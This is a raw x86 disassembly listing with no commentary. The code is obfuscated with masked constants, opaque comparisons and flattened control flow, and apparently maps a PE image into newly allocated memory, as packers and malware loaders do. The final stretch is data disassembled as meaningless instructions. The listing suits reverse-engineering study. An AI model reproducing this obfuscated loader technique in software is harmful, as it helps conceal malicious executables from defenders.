  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	data16 hlt 
  420607:	jb     0x42062e
  420609:	cwde   
  42060a:	or     BYTE PTR [ebx+0x1fb0001],al
  420610:	add    BYTE PTR [eax],al
  420612:	inc    esp
  420613:	mov    dh,0xf0
  420615:	popf   
  420616:	rcl    DWORD PTR [ebp+eiz*8+0xa021305],0x73
  42061e:	push   esi
  42061f:	call   0xfc98:0xd947b983
  420626:	adc    eax,DWORD PTR [edx-0x281226c3]
  42062c:	leave  
  42062d:	in     eax,dx
  42062e:	js     0x420641
  420630:	jne    0x42061b
  420632:	or     BYTE PTR [ebx-0x1c],ch
  420635:	mov    ecx,0xad2906bd
  42063a:	call   0xa8b303c9
  42063f:	in     al,0x15
  420641:	push   edi
  420642:	push   ecx
  420643:	test   BYTE PTR ds:0x36c8aba6,0xd8
  42064a:	out    0xbe,al
  42064c:	clc    
  42064d:	dec    esi
  42064e:	aaa    
  42064f:	addr16 fxch st(7)
  420652:	jl     0x420689
  420654:	push   ebp
  420655:	fwait
  420656:	push   0x1bff7e63
  42065b:	pop    ebx
  42065c:	adc    al,0x8a
  42065e:	mov    esi,0xd4fe3360
  420663:	mov    ecx,0xb2b68b8a
  420668:	fiadd  DWORD PTR [ebx+0x26]
  42066b:	mov    al,ds:0xe3dbe5ea
  420670:	and    ah,BYTE PTR [eax+0x71]
  420673:	repnz or BYTE PTR [esi+0x3c],0x71
  420678:	enter  0xa98e,0x78
  42067c:	call   0x7512:0x72e5393c
  420683:	je     0x42066b
  420685:	std    
  420686:	popf   
  420687:	xchg   edx,eax
  420688:	je     0x420631
  42068a:	bound  esi,QWORD PTR [eax]
  42068c:	pop    edx
  42068d:	stc    
  42068e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42068f:	jmp    0x688f:0x2212345d
  420696:	js     0x42062d
  420698:	(bad)  
  420699:	stc    
  42069a:	xor    esi,DWORD PTR [edx+0x54]
  42069d:	js     0x420694
  42069f:	sbb    al,0x6f
  4206a1:	ret    0x1cc6
  4206a4:	pop    edi
  4206a5:	cmp    eax,0xa8086861
  4206aa:	iret   
  4206ab:	sub    al,0x1f
  4206ad:	ror    ah,0x33
  4206b0:	mov    esp,0x5d819f66
  4206b5:	cmp    eax,0xa3e94796
  4206ba:	into   
  4206bb:	jno    0x42072d
  4206bd:	call   0xf76701fd
  4206c2:	push   esi
  4206c3:	adc    dh,BYTE PTR [eax+eax*4-0x7d129af1]
  4206ca:	dec    ebx
  4206cb:	jle    0x4206e5
  4206cd:	rcl    DWORD PTR [edi],1
  4206cf:	push   eax
  4206d0:	jb     0x4206f1
  4206d2:	jmp    0x9f97e9ba
  4206d7:	pop    ebx
  4206d8:	ins    DWORD PTR es:[edi],dx
  4206d9:	xlat   BYTE PTR ds:[ebx]
  4206da:	ficomp DWORD PTR [eax+0x1a]
  4206dd:	xor    ah,0xdc
  4206e0:	cmp    ebp,DWORD PTR [esi-0x3a]
  4206e3:	inc    edi
  4206e4:	fbstp  TBYTE PTR [ecx]
  4206e6:	es pop ebx
  4206e8:	mov    DWORD PTR [eax+0x45c55a03],esi
  4206ee:	pop    ds
  4206ef:	lods   eax,DWORD PTR ds:[esi]
  4206f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f1:	xor    esi,ebp
  4206f3:	mov    dl,0xba
  4206f5:	mov    al,0x66
  4206f7:	(bad)  
  4206f8:	and    edx,DWORD PTR [eax]
  4206fa:	pop    esi
  4206fb:	loop   0x420742
  4206fd:	fwait
  4206fe:	jl     0x4206ea
  420700:	mov    edx,0x5449ec97
  420705:	lds    esi,FWORD PTR [eax]
  420707:	add    al,0x93
  420709:	icebp  
  42070a:	mov    ecx,0xbbfd5153
  42070f:	mov    eax,0x7bcaae99
  420714:	test   eax,0x7d901476
  420719:	mov    bh,0x9e
  42071b:	add    BYTE PTR [esi],dl
  42071d:	les    ebx,FWORD PTR [ebp-0x4652b960]
  420723:	jecxz  0x420766
  420725:	sub    al,0xfa
  420727:	(bad)  
  420729:	mov    dh,0x33
  42072b:	loop   0x420774
  42072d:	push   cs
  42072e:	outs   dx,DWORD PTR ds:[esi]
  42072f:	idiv   ebx
  420731:	nop
  420732:	cwde   
  420733:	adc    BYTE PTR [eax-0x16],dl
  420736:	lods   eax,DWORD PTR ds:[esi]
  420737:	push   ss
  420738:	dec    edi
  420739:	popa   
